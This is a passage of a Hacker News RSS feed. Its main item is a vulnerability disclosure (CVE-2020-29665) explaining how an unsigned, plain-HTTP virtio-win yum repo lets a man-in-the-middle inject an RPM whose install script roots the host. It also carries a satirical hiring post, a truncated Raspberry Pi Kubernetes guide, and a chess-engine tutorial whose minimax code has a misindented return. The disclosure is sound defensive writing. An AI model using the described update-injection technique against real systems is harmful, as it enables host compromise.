December 23, 2020 | https://giannitedesco.github.io/2020/12/23/virtio-win-yum-repo-vulnerable.html | <a href="https://web.archive.org/web/*/https://giannitedesco.github.io/2020/12/23/virtio-win-yum-repo-vulnerable.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="main_content">
        <small>23 December 2020</small>


<p>by Gianni Tedesco</p>

<p>If you have <em>ever</em> installed the <code>virtio-win</code> package in accordance with the
<a href="https://docs.fedoraproject.org/en-US/quick-docs/creating-windows-virtual-machines-using-virtio-drivers/index.html">instructions from
fedora</a>,
then your system is vulnerable to a remote root exploit every time you do a yum
upgrade, and will stay like that forever more, until you remove the virtio-win
yum repo.</p>

<p>That is because the instructions tell you to setup a yum repo with the with a
plain http <code>baseurl</code> and <code>gpgcheck=0</code>… This, essentially, disables all
security and allows a network man-in-the-middle (even a regular old web proxy)
to inject bogus updates every time you do a <code>dnf upgrade</code> - which will be
nightly if you have installed <code>dnf-automatic</code>.</p>

<p>This entire process, including exploitation, can happen without dnf providing
any hint to the user that it is downloading arbitrary code insecurely over the
internet and running it.</p>


<p>Turns out that there is not a whole lot you can do about this yet. My best
advice to you is to disable this yum repo immediately.</p>

<p>I reported this bug <a href="https://bugzilla.redhat.com/show_bug.cgi?id=1878594">in
September</a> but it turns
out it had already been <a href="https://bugzilla.redhat.com/show_bug.cgi?id=1353036">reported in January
2016</a>.</p>

<p>There is <a href="https://github.com/virtio-win/virtio-win-pkg-scripts/issues/24">a github
issue</a> tracking
the change required to sign the contents of virtio-win repository.</p>


<p>Note, that the windows drivers themselves are signed. That’s because loading
windows drivers without signatures is a complete rigmarole so the drivers would
be next to useless if they weren’t signed.</p>

<p>But here, the signatures are luring people in to a false sense of security
because you may imagine that since all RPM is doing is downloading some opaque
blobs which only a guest will install, that as long as the blobs are signed and
the windows guest OS verifies them then an end-to-end root of trust is
established.</p>

<p>But this is not so, since the Linux host is compromised. All an attacker has to
do is create a new RPM based on the old virtio-win RPMs (including all the
valid signatures) and just add a <code>%postinstall</code> RPM script which roots the
host. So now it doesn’t matter that the guest is secure, because the host is
compromised. And if the host is compromised then all bets about the integrity
of the guest are off.</p>

<p>If RPM applied its signatures with the same dilligence as Windows update, we
probably would not be in this mess.</p>

<p>I also filed <a href="https://bugzilla.redhat.com/show_bug.cgi?id=1878595">a bug against
dnf</a> that it insecurely
installs code from the internet without so much as a warning message.</p>


<p>Initially I thought that a quick workaround would be to change the repo URL to
https. After all, <code>fedoraproject.org</code> should be trustworthy.</p>

<p>But according to the DNF developers “DNF is happy with any HTTPS connection,
even with a self-signed certificate and a complete redirect to a different
server would be unnoticed.”</p>

<p>Apparently there is a plan to solve this but it won’t land before RHEL9 because
the user experience would necessarily change if dnf were to check HTTPS
certificates.</p>

<p>Of course, there are good historical reasons not to use TLS, it breaks
caching. But given todays threat landscape, mirror services may just want to
suck up this cost.</p>


<p>Merry christmas, happy new year, it’ll soon be 2021, and here’s to another year
of telling people that arbitrary remote code execution is arbitrary remote code
execution.</p>

<p>You can refer to the virtio-win repo issue as <code>CVE-2020-29665</code>.</p>



  <small>tags: <em>security</em> - <em>vuln</em> - <em>cve</em> - <em>virtio-win</em> - <em>fedora</em> - <em>redhat</em> - <em>cve-2020-29665</em></small>








      </section></div>]]>
            </description>
            <link>https://giannitedesco.github.io/2020/12/23/virtio-win-yum-repo-vulnerable.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25516915</guid>
            <pubDate>Wed, 23 Dec 2020 12:35:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[IMGZ Is Hiring]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25516914">thread link</a>) | @sirodoht
<br/>
December 23, 2020 | https://imgz.org/blog/2020/12/23/haha-suckers/ | <a href="https://web.archive.org/web/*/https://imgz.org/blog/2020/12/23/haha-suckers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
Posted on
<time itemprop="datePublished" datetime="2020-12-23">December 23, 2020</time>.
</p><div itemprop="articleBody"><p>A few weeks ago, we wrote a massively successful <a href="#">IMGZ systems architecture article</a> that ended up going viral (note to editor: are we still allowed to say "viral" in 2020?) and upending the world of image hosting.
Here we were, a small newcomer, poised to take on the giants of the multi-billion-dollar image hosting industry with our new, innovative and daring business model of charging people for services.</p>
<p>As you can imagine, all the media attention caused our user count to skyrocket, and our subscription graph started exhibiting the familiar "hockey stick" pattern that every VC in Silicon Valley wants to be hit with:</p>
<p><img src="https://imgz.org/iQYRKWrE.png" alt=""></p>
<p>Rather unsurprisingly, such an influx of new users caused a deluge of new content being uploaded to the platform. We estimate that, with our current level of usage, up to a thousand images could be getting uploaded to the service every year.</p>
<p>Naturally, we immediately sprang into action to preserve the reliability of our infrastructure, and quickly drew up a scaling plan that would enable the service to withstand its newfound popularity. This is where our foresight when designing the service paid off, as the hosting provider we use let us quickly perform the necessary changes and provision an extra gigabyte of disk space.</p>
<h2>One thing becomes clear</h2>
<p>However, one thing became clear: We could not sustain this breakneck pace for long by ourselves. This was never more obvious than a few days ago, when we realized we were close to failing to meet our uptime guarantee for 2020, and had to take the service offline for a few days to bring our uptime down to what we promised.</p>
<p>This event highlighted that there is just too much to do in a fledgling startup that aims to become the next MySpace, and even more to do in one that specifically wants to <em>avoid</em> becoming the next MySpace. If we were ever to realize the IMGZ vision and change the world, we needed more people.</p>
<h2>We're hiring!</h2>
<p>If you're young, passionate about creating software that changes the world and don't know what "3x investor preference" means, you're exactly who we're looking for! You have the opportunity to join an innovative, fast-growing company with a modern technology stack.</p>
<p>At IMGZ, we don't just want to serve images, no. The values of IMGZ are far loftier than that. At IMGZ we live and breathe images to the point where our values can only be communicated <strong>with</strong> an image:</p>
<p><img src="https://imgz.org/i9xyk2H2.png" alt=""></p>
<p>In talking with various prospective hires, one thing became abundantly clear: Nobody joins a startup for the money, they do it to get rich. With this in mind, we found the perfect balance of the "early startup employee" compensation package: 50% stock, 50% equity, 0% salary.</p>
<p>That's right! We can maximize the potential of your stock by doing away with a significant company expense: Employee salaries. This way, your stock is much more likely to be worth a lot more (and you have a lot of it, since our packages start at three trillion shares per employee! That's a big number).</p>
<p>Everyone we discussed this with loved the approach, and it makes intuitive sense: Name one Google employee who became a millionaire from their salary. We bet you can't, yet all of us know the name of that cleaning lady who was given Google stock and now she has "VC" on her CV, you know the one we're talking about.</p>
<h2>Interview process</h2>
<p>Like any self-respecting Silicon Valley startup, we can't just settle for any old 10x rockstar developer who wants to join. Firing people is expensive, you know? That is why we have prepared a thorough, six-stage interview process.</p>
<p>We pride ourselves on being a pragmatic, practice-driven development team, and we want to see how you perfom in real-world scenarios, so you will be given a feature from our product roadmap and will be asked to develop it to your satisfaction. Afterwards, we will use this feature in our product and see how users like it. If they do, that will be a point in your favor.</p>
<p>Of course, we can't really know if you developed the feature yourself or paid someone on Fiverr to do it for you, so for the next stage of the interview we will ask you to invert a data structure on a whiteboard. None of us knows how or cares enough about what you're doing, so we'll pretend to not like random things about your solution until you're on the verge of tears, to evaluate how you fare against the ever-changing requirements that come with bad leadership.</p>
<p>If you pass the whiteboard interviews without cracking, we'll introduce you to everyone on the team, making sure you have at least eight hours of one-on-one time with various staff members, often more than once. This is just so we get to know you better and see what you're like in social situations.</p>
<p>After wasting a few days of your time and ours, we'll finally adjourn and haphazardly email each other about you, mostly trying to remember which applicant you were from flaws in your appearance. We'll then round up all the notes and observations from your technical interviews and summarize everything we know about you into one list.</p>
<p>For the final decision, we'll look at the list and evaluate you purely on your technical merits, trying to confirm the judgment that we've already subconsciously formed based on how much you are like us. If you are too different, we're sorry, no matter how good you are technically, we'll pass. In this company, we value one thing above all others: Diversity.</p>
<h2>Apply today!</h2>
<p>If the above sounds appealing, excellent! Reach out to us at <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ"><span data-cfemail="b9d1d0cbd0d7def9d0d4dec397dad6d4">[email&nbsp;protected]</span></a> to get the ball rolling, and you might soon be "working" for the best image host in the world, IMGZ!</p>
</div></div>]]>
            </description>
            <link>https://imgz.org/blog/2020/12/23/haha-suckers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25516914</guid>
            <pubDate>Wed, 23 Dec 2020 12:35:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Self-hosting Kubernetes on your Raspberry Pi]]>
            </title>
            <description>
<![CDATA[
Score 24 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25516834">thread link</a>) | @yannovitch
<br/>
December 23, 2020 | https://blog.alexellis.io/self-hosting-kubernetes-on-your-raspberry-pi/ | <a href="https://web.archive.org/web/*/https://blog.alexellis.io/self-hosting-kubernetes-on-your-raspberry-pi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>

        

        <section>
            <div><p>The aim of this post is to show you how to build a Kubernetes cluster with Raspberry Pi 4s for self-hosting APIs, websites and functions so that you can expose them on the Internet and serve traffic to users. Use it to evaluate your current setup, or to plan a new build including: hardware options, HA, Ingress, storage and Operating System choices.</p>
<p>We'll start by addressing the usual questions, before going on to explore a number of topics in detail. These are my preferences built-up after <a href="https://www.raspberrypi.org/blog/five-years-of-raspberry-pi-clusters/">building clusters on Raspberry Pi for 5 years</a>. I'd also like to learn from you, so feel free to tweet to me <a href="https://twitter.com/alexellisuk">@alexellisuk</a>.</p>
<p><strong>Why self host?</strong></p>
<p>The only valid reason here is: because you want to. And if the idea of self-hosting something turns you off, then stop reading now and post a derisive comment on Hacker News.</p>
<p><a href="https://www.youtube.com/watch?v=jfUpF40--60"><img src="https://pbs.twimg.com/media/EnSvvQRXcAEEr1w?format=jpg&amp;name=medium" alt="My demo rig for the KubeCon talk"></a></p>
<blockquote>
<p>KubeCon talk: <a href="https://www.youtube.com/watch?v=jfUpF40--60">The Past, Present, and Future of Kubernetes on Raspberry Pi</a></p>
</blockquote>
<p><strong>The costs of cloud</strong></p>
<blockquote>
<p>I was speaking to a friend recently that told me they were paying 7USD / mo to host 20 small projects on a well-known PaaS. That would have been costing them around 1700USD per year, moving those workloads to an RPi would save a fortune.</p>
</blockquote>
<p>Running a Kubernetes cluster on one of the cheapest providers like <a href="https://m.do.co/c/f0d7296632e4">DigitalOcean</a> can still set you back 60-120 USD / mo for a modest cluster. You can get much better value with your own hardware, whether that's with an old PC or some Raspberry Pis. I'm not saying that you should call your boss and give him the good news, but there is a certain crowd who enjoy building and running infrastructure, they also tend to enjoy cost savings.</p>
<p><strong>"But, I have no use-case"</strong></p>
<p>Quite often my content on Raspberry Pi can be divisive. It brings the best out of some people, and the worst out of others.</p>
<p>Let me put this succinctly - the Raspberry Pi is a Linux server. If you write code, or "do DevOps" for a day-job, you have a use-case. If you use a computer on a daily basis, you have a use-case.</p>
<p><img src="https://blog.alexellis.io/content/images/2020/12/4rea8y.jpg" alt="Meme"></p>
<blockquote>
<p>I'll just leave this here.</p>
</blockquote>
<p><strong>Why use the Raspberry Pi?</strong></p>
<p>If you have the budget to buy some used workstations, NUCs, or servers on eBay, they will perform better, but they also take up more space and draw more power. Fortunately, most of what we'll cover will apply to Raspberry Pi and whatever Intel kit you can get your hands on.</p>
<p><strong>But, I thought SD cards were unreliable?</strong></p>
<p>Now that the <a href="https://alexellisuk.medium.com/upgrade-your-raspberry-pi-4-with-a-nvme-boot-drive-d9ab4e8aa3c2">RPi 4 can boot from an SSD or NVMe over USB</a>, the reliability of SD cards no longer needs to be a concern. The RPi 4 has much faster I/O, up to 8GB of RAM available along with a quad-core processor. Not only is it suitable for self-hosting many types of application, but it is likely to outperform smaller shared VPSes or EC2 instances since it's a dedicated host.</p>
<p>It's now trivial to build a cluster that can tolerate a node failure using K3s and its now embedded etcd mode which was introduced in K3s 1.19.</p>
<p>There are naturally some draw-backs to self-hosting: you have a dependency on your ISP's uptime, your significant other or children could unplug your infrastructure (yes it happens), but I think you will have fun and hone your skills.</p>
<blockquote>
<p>So whether you're building a home-lab, or looking to host websites, APIs and automation tools, I hope you'll find the recommendations useful.</p>
</blockquote>

<p><img src="https://pbs.twimg.com/media/Ep3STrhWMAAL7mz?format=jpg&amp;name=small" alt="The parts from my latest build"></p>
<blockquote>
<p>The parts from my latest K3s build</p>
</blockquote>
<h3 id="billofmaterialshardware">Bill of materials (hardware)</h3>
<p>You will need at least one Raspberry Pi 4 with 2GB RAM or more. I would recommend that you buy three if you wish to run a HA cluster, that can tolerate a node failure.</p>
<p><strong>Managing costs</strong></p>
<p>Let me put this in bold: <strong>you do not need to spend a fortune to build a cluster</strong>. 4x RPi 4 including taxes in the UK runs to about 33 GBP per unit ~ about 130 GBP total. If you just want the experience of self-hosting, and to learn about Kubernetes without having to spend too much, you could buy a single 4GB RPi 4 for around 54 GBP including taxes.</p>
<p><strong>A note on the RPi3</strong></p>
<blockquote>
<p>The Raspberry Pi 3 and CM3 are both <a href="https://github.com/k3s-io/k3s/issues/2353">having issues with K3s</a>, particulary if you are running anything later than 1.17. If you have an existing investment (as I do), I would suggest selling them or giving them away.</p>
</blockquote>
<p><strong>Cases and cooling off</strong></p>
<p>Whatever case you decide to use, make sure it has a fan. You can compare options in my post <a href="https://blog.alexellis.io/cooling-off-your-rpi4/">Cooling off your Raspberry Pi 4</a>.</p>
<p>The best options for cases are either one of the sets of acrylic plates and stand-offs that can be bought for 20-25 USD on Amazon, or a professional-grade <a href="https://bitscope.com/blog/JK/?p=JK38B">BitScope Cluster Blade</a>. Whatever you do, do not buy the original first-generation BitScope Blade which doesn't support the RPi4 or have cooling.</p>
<p><strong>Buy the best power adapter</strong></p>
<p>Do not buy a multi-charger for the RPi4, they may appear to work, however if you look into things you will find that they are "browning out". Official adapters are not expensive, my advise is not to be stingy.</p>
<p><strong>Storage</strong></p>
<p>When it comes to storage, you will need at least a 32GB SD card, but I would encourage you to go one further and buy solid state storage. Read about the performance differences in my post: <a href="https://alexellisuk.medium.com/upgrade-your-raspberry-pi-4-with-a-nvme-boot-drive-d9ab4e8aa3c2">Upgrade your Raspberry Pi 4 with a NVMe boot drive</a>. Some ask whether an M2 SSD is sufficient with the USB-bus of the RPi4 causing a bottleneck. They make a good point however the NVMe performs better, has a similar cost and can be used in one of your PCs at a later date.</p>
<h3 id="kuberneteskubeadmvsk3s">Kubernetes - kubeadm vs. k3s?</h3>
<p>Until late 2019, most of us were still struggling to run <a href="https://github.com/alexellis/k8s-on-raspbian">upstream Kubernetes on our RPis with kubeadm</a>, and it was not a pleasant experience. Why? Because kubeadm was designed to run on high-performance Intel cloud servers, not on low-powered ARM SoCs.</p>
<p><img width="30%" src="https://k3s.io/images/logo-k3s.svg" alt="k3s"></p><p>The headlines for K3s claim 500MB of RAM is required for a server, increasing 256MB when using embedded etcd. The claim for an agent is 50MB of RAM. Whatever the actual usage is, it's going to be much less than kubeadm and put less of a load on the system.</p>
<h3 id="32bitor64bitos">32-bit or 64-bit OS?</h3>
<p>From my perspective the main limitation of a 32-bit OS is the 3GB process limit. That isn't something that I'm particularly worried about, but maybe you are? What the question really comes down to is: do you want to use Ubuntu or RaspiOS?</p>
<p><img src="https://www.raspberrypi.org/wp-content/uploads/2011/10/Raspi-PGB001.png" width="30%">
<img src="https://assets.ubuntu.com/v1/fe951eda-20.10_Groovy+Gorilla_RPi_Sketch.svg" width="20%"></p><p>The Raspberry Pi Foundation do have a beta version of RaspiOS out, however it isn't the lite edition and comes with a fully-loaded desktop.</p>
<p>In my experience with K3s, <a href="https://ubuntu.com/blog/ubuntu-20-10-on-raspberry-pi-delivers-the-full-linux-desktop-and-micro-clouds">Ubuntu 20.10</a> works equally well as RaspiOS Lite on the RPi4. I tend to recommend with RaspiOS with its 32-bit OS because most Raspberry Pi users already use this and are comfortable with it.</p>
<h3 id="sourcingappsandcharts">Sourcing apps and charts</h3>
<p>Sourcing apps and charts can be tricky with ARM, as many maintainers have not yet considering porting their software to this architecture.</p>
<p>For that reason I built the <a href="https://get-arkade.dev/">arkade</a> project as an Open Source Kubernetes Marketplace. You can use it to install apps whether they are packaged as Helm charts, YAML manifests or shipped with their own CLI.</p>
<p>Why not use helm? Well in some instances it does, but where a package is not available for ARM, it will tell you. Where a chart has 150 configuration options, the <code>--help</code> text tells you the ones we think you'll need. The <code>arkade info APP</code> command gives you instructions on how to use the chart, and you can get that back at any time without installing the app again.</p>
<p><img src="https://github.com/alexellis/arkade/raw/master/docs/arkade-logo-sm.png" width="20%"><br>
There are now over 40 packages and many contributors. Notable packages that work on Raspberry Pi are: Minio, OpenFaaS, cert-manager, ingress-nginx, Traefik 2, Linkerd, SealedSecrets and the Kubernetes dashboard.</p>
<p>You can install of them using arkade install:</p>
<pre><code>arkade install APP
</code></pre>
<p>arkade also offers a fast download of CLIs to prevent breaking the flow when you're following instructions. How many times have you ran "brew update" and then instantly regretted it?</p>
<pre><code>arkade get kubectl [--version 0.19.5]
arkade get kubectx
arkade get helm
arkade get terraform
</code></pre>
<p>Each package is downloaded as a static binary and put in your PATH. It doesn't matter if you're using Intel or ARM, Linux, MacOS or Windows, the correct binary (if available) will be downloaded.</p>
<blockquote>
<p>Warning: Whatever you do, resist the urge to run "third-party" or community builds of tools you recognise. This is asking for trouble, the code could be doing anything to your computers and network. See also: "Poison docker images"</p>
</blockquote>
<h3 id="ingressandloadbalancers">Ingress and LoadBalancers</h3>
<p>There are two main ways I would expose services on Kubernetes. The first is to use a LoadBalancer, this is what you will be most used to from using managed Kubernetes clusters. By setting your Service as a <code>type: LoadBalancer</code> and giving a number of ports, a cloud load-balancer is provisioned and starts routing traffic on the given IP address.</p>
<p>When running at home, you can use a tool like <a href="https://kube-vip.io/">kube-vip</a> or <a href="https://metallb.universe.tf/">MetalLB</a>, but they will only give you IP addresses on your local network, which external users cannot access. If you are thinking of using these tools, you may as well just use a <a href="https://kubernetes.io/docs/concepts/services-networking/service/">NodePort</a> and forego the additional tooling. A NodePort makes a high port number such as 31112 available on all your nodes, which then routes traffic to the exposed service.</p>
<p>Many homelab'ers will be aware of port-forwarding, where your home router can be set to forward traffic on a given set of ports to hosts on your internal network. This is achieved through mapping a high non-standard port number to the internal port. Unfortunately, many home users are inadvertently giving away their location, their ISP customer number (Virgin Media, I'm looking at you), and in some instance, a good estimation of their home address. Now on top of all of that, you cannot take that IP address with you, so if you close the lid of your laptop running K3s, and open the lid on a captive portal in a coffee shop, your services will no longer be available.</p>
<p>Likewise, your IP is likely to change. The mitigation is to run a daemon that continually checks your IP address and updates your DNS records.</p>
<p>That all sounds like a lot of hard work to me.</p>
<p>In the early days, I used to use Ngrok which tunnels out from your internal network, but unfortunately I kept running into its connection and rate-limiting. It also has no Kubernetes integration, and it's not for lack of trying - Joe Beda (a …</p></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.alexellis.io/self-hosting-kubernetes-on-your-raspberry-pi/">https://blog.alexellis.io/self-hosting-kubernetes-on-your-raspberry-pi/</a></em></p>]]>
            </description>
            <link>https://blog.alexellis.io/self-hosting-kubernetes-on-your-raspberry-pi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25516834</guid>
            <pubDate>Wed, 23 Dec 2020 12:27:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Novichok Nerve Agent Poisoning]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25516753">thread link</a>) | @Tomte
<br/>
December 23, 2020 | https://sci-hub.st/https://doi.org/10.1016/S0140-6736(20)32644-1 | <a href="https://web.archive.org/web/*/https://sci-hub.st/https://doi.org/10.1016/S0140-6736(20)32644-1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://sci-hub.st/https://doi.org/10.1016/S0140-6736(20)32644-1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25516753</guid>
            <pubDate>Wed, 23 Dec 2020 12:14:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: A simple web app to create holiday cards from any photo]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25516523">thread link</a>) | @ea016
<br/>
December 23, 2020 | https://photoroom.com/holiday-card-maker/ | <a href="https://web.archive.org/web/*/https://photoroom.com/holiday-card-maker/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://photoroom.com/holiday-card-maker/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25516523</guid>
            <pubDate>Wed, 23 Dec 2020 11:21:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building My Own Chess Engine]]>
            </title>
            <description>
<![CDATA[
Score 114 | Comments 36 (<a href="https://news.ycombinator.com/item?id=25516430">thread link</a>) | @rbanffy
<br/>
December 23, 2020 | https://healeycodes.com/building-my-own-chess-engine/ | <a href="https://web.archive.org/web/*/https://healeycodes.com/building-my-own-chess-engine/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><p>December 20, 2020<!-- --> in<!-- --> <span><a href="https://healeycodes.com/tags/python">Python</a></span></p></header><section><p>I have been learning chess (again) and how to program a chess engine (for the first time) over the last month. After skimming some introductory texts, I was convinced that building a simple chess engine — one that would put up a fair fight against a casual player — would take no more than a few days.</p>
<p>I was wrong.</p>
<p>But I made it there in the end and created a toy chess engine (<a href="https://github.com/healeycodes/andoma">healeycodes/andoma</a>) that I am proud of. It can play a game of chess and solve simple chess puzzles like mate-in-two or mate-in-three. It has a slim UCI interface which means it can be hooked up to lichess.org via <a href="https://github.com/ShailChoksi/lichess-bot">lichess-bot</a> — a bridge between the lichess API and chess bots.</p>
<p>The first speed bump in its development was grasping the computational the complexity of chess — how fast, and wide, the search tree grows. When a chess game starts, white can open in twenty different ways and black can respond in twenty different ways also. After the first full turn, there are 400 variations possible. After the third full turn, there are <a href="https://en.wikipedia.org/wiki/Shannon_number#Shannon's_calculation">over 119 million</a>.</p>
<p>Claude Shannon calculated that there are around <code>10^120</code> possible games of chess in his seminal paper <em>Programming a Computer for Playing Chess</em> in 1950. In <em>Rage Against the Machines</em>, Nate Silver <a href="https://fivethirtyeight.com/features/rage-against-the-machines/">quotes</a> Diego Rasskin-Gutman, who said:</p>
<blockquote>
<p>There are more possible chess games than the number of atoms in the universe.</p>
</blockquote>
<p>Given unlimited resources, it actually doesn’t take many lines of code to calculate every legal variation of chess. Here, the Python package <a href="https://python-chess.readthedocs.io/en/latest/">python-chess</a> is used for board representation and legal move generation.</p>
<div data-language="python"><pre><code><span>from</span> chess <span>import</span> Board<span>,</span> Move<span>,</span> STARTING_FEN


positions <span>=</span> <span>{</span><span>}</span>


<span>def</span> <span>generate_tree</span><span>(</span>fen<span>)</span><span>:</span>
    board <span>=</span> Board<span>(</span>fen<span>)</span>
    legal_moves <span>=</span> <span>list</span><span>(</span>board<span>.</span>legal_moves<span>)</span>
    <span>if</span> fen <span>in</span> positions<span>:</span>
        positions<span>[</span>fen<span>]</span> <span>+=</span> legal_moves
    <span>else</span><span>:</span>
        positions<span>[</span>fen<span>]</span> <span>=</span> legal_moves

    <span>for</span> move <span>in</span> legal_moves<span>:</span>
        board<span>.</span>push<span>(</span>move<span>)</span>
        next_fen <span>=</span> board<span>.</span>fen<span>(</span><span>)</span>
        board<span>.</span>pop<span>(</span><span>)</span>
        
        generate_tree<span>(</span>next_fen<span>)</span>

<span>try</span><span>:</span>
    generate_tree<span>(</span>STARTING_FEN<span>)</span>
<span>except</span> RecursionError<span>:</span> 
    <span>print</span><span>(</span><span>len</span><span>(</span>positions<span>)</span> <span>+</span> <span>sum</span><span>(</span><span>len</span><span>(</span>p<span>)</span> <span>for</span> p <span>in</span> positions<span>)</span><span>)</span></code></pre></div>
<p>This program throws a <code>RecursionError</code> and prints <code>59691</code> — the number of different positions the search tree contained when it crashed. All we need to fix this, is another universe to run the program in.</p>
<p>Given that there are computational limits to abide by, as well as the time control rules of chess, improvements over a naive brute force search must be made.</p>
<h2 id="evaluation"><a href="#evaluation" aria-label="evaluation permalink"></a>Evaluation</h2>
<p>In order to search for good positions, it is necessary to understand what makes a good position <em>good</em>. The most simplistic way of describing a position’s strength is to compare the total value material of each side.</p>
<p>Tomasz Michniewski, author of the <a href="https://www.chessprogramming.org/Simplified_Evaluation_Function">Simplified Evaluation Function</a>, defined some values that are “designed specifically to compensate for the lack of any other chess knowledge”. This is perfect for me — a beginner chess player.</p>
<p>This snippet sums the material on the initial board using Michniewski’s piece values.</p>
<div data-language="python"><pre><code><span>import</span> chess

piece_values <span>=</span> <span>{</span>
    chess<span>.</span>PAWN<span>:</span> <span>100</span><span>,</span>
    chess<span>.</span>ROOK<span>:</span> <span>500</span><span>,</span>
    chess<span>.</span>KNIGHT<span>:</span> <span>320</span><span>,</span>
    chess<span>.</span>BISHOP<span>:</span> <span>330</span><span>,</span>
    chess<span>.</span>QUEEN<span>:</span> <span>900</span><span>,</span>
    chess<span>.</span>KING<span>:</span> <span>20000</span>
<span>}</span>

board <span>=</span> chess<span>.</span>Board<span>(</span>chess<span>.</span>STARTING_FEN<span>)</span>
white_material <span>=</span> <span>0</span>
black_material <span>=</span> <span>0</span>

<span>for</span> square <span>in</span> chess<span>.</span>SQUARES<span>:</span>
    piece <span>=</span> board<span>.</span>piece_at<span>(</span>square<span>)</span>
    <span>if</span> <span>not</span> piece<span>:</span>
        <span>continue</span>
    <span>if</span> piece<span>.</span>color <span>==</span> chess<span>.</span>WHITE<span>:</span>
        white_material <span>+=</span> piece_values<span>[</span>piece<span>.</span>piece_type<span>]</span>
    <span>else</span><span>:</span>
        black_material <span>+=</span> piece_values<span>[</span>piece<span>.</span>piece_type<span>]</span></code></pre></div>
<p>Michniewski also provides <a href="https://www.chessprogramming.org/Piece-Square_Tables">piece-square tables</a>, which alter the value of a piece depending on which square it sits on. For example, it’s better for pawns to progress up the board and it’s better for knights to be near the center of the board.</p>
<p>The bonus of a square may be positive, neutral, or negative. The piece-square tables are presented from White’s POV and must be mirrored for Black.</p>
<div data-language="text"><pre><code># a knight's bonuses depending on square
-50,-40,-30,-30,-30,-30,-40,-50,
-40,-20,  0,  0,  0,  0,-20,-40,
-30,  0, 10, 15, 15, 10,  0,-30,
-30,  5, 15, 20, 20, 15,  5,-30,
-30,  0, 15, 20, 20, 15,  0,-30,
-30,  5, 10, 15, 15, 10,  5,-30,
-40,-20,  0,  5,  5,  0,-20,-40,
-50,-40,-30,-30,-30,-30,-40,-50,</code></pre></div>
<p>For the king, Michniewski provides two tables — one for the middle game and one for the end game. He defines the end game as being either if:</p>
<blockquote>
<p>Both sides have no queens or</p>
</blockquote>
<blockquote>
<p>Every side which has a queen has additionally no other pieces or one minorpiece maximum.</p>
</blockquote>

<p>The evaluation of a chess board is one of the things that’s kept me interested in chess engines. Evaluation rules are easy to add and take away. I refactored the code from Go to Python to be able to prototype different rules faster.</p>
<p>After piece-square tables, one might look at pawn structure, mobility, center control, connectivity, trapped pieces, king safety, space, tempo, and other patterns (this list is taken from the Chess Programming Wiki’s <a href="https://www.chessprogramming.org/Evaluation">Evaluation</a> page).</p>
<h2 id="searching-with-minimax"><a href="#searching-with-minimax" aria-label="searching with minimax permalink"></a>Searching With Minimax</h2>
<p><a href="https://en.wikipedia.org/wiki/Minimax">Minimax</a> is a search algorithm that finds the next optimal move by minimizing the potential loss in a worst case scenario. Chess is a game of perfect information — by looking at the board it’s possible to know exactly what an opponent is capable of. However, this search for moves is limited by the evaluation function and the depth that computing resources are able to reach.</p>
<p>The search space is a tree of legal moves which grows exponentially at every level (the average branching factor is around 35). By the time the tree is explored, the path to many future boards is known as well as which path restricts the opponent’s possible gains the most.</p>
<p>The leaf nodes of the tree return the evaluation of their current state. Non-leaf nodes inherit their value from a descendant node. Eventually, the recursive function reduces down to a value for the given board.</p>
<p>This function can be used to pick the next best move by calling it on every legal move available in the current turn. A great visual resource for this algorithm is Sebastian Lague’s <a href="https://www.youtube.com/watch?v=l-hh51ncgDI">Algorithms Explained – minimax and alpha-beta pruning</a>.</p>
<div data-language="python"><pre><code><span>def</span> <span>minimax</span><span>(</span>board<span>,</span> depth<span>,</span> maximizing_player<span>)</span><span>:</span>
    <span>if</span> depth <span>==</span> <span>0</span> <span>or</span> board<span>.</span>is_game_over<span>(</span><span>)</span><span>:</span>
        <span>return</span> evaluate<span>(</span>board<span>)</span>
    <span>if</span> maximizing_player<span>:</span>
        value <span>=</span> <span>-</span><span>float</span><span>(</span><span>'inf'</span><span>)</span>
        <span>for</span> move <span>in</span> board<span>.</span>legal_moves<span>:</span>
            board<span>.</span>push<span>(</span>move<span>)</span>
            value <span>=</span> <span>max</span><span>(</span>value<span>,</span> minimax<span>(</span>board<span>,</span> depth <span>-</span> <span>1</span><span>,</span> <span>False</span><span>)</span><span>)</span>
            board<span>.</span>pop<span>(</span><span>)</span>
	    <span>return</span> value
    <span>else</span><span>:</span>
        value <span>=</span> <span>float</span><span>(</span><span>'inf'</span><span>)</span>
        <span>for</span> move <span>in</span> board<span>.</span>legal_moves<span>:</span>
            board<span>.</span>push<span>(</span>move<span>)</span>
            value <span>=</span> <span>min</span><span>(</span>value<span>,</span> minimax<span>(</span>board<span>,</span> depth <span>-</span> <span>1</span><span>,</span> <span>True</span><span>)</span><span>)</span>
            board<span>.</span>pop<span>(</span><span>)</span>
        <span>return</span> value</code></pre></div>
<h2 id="alpha-beta-pruning"><a href="#alpha-beta-pruning" aria-label="alpha beta pruning permalink"></a>Alpha-beta pruning</h2>
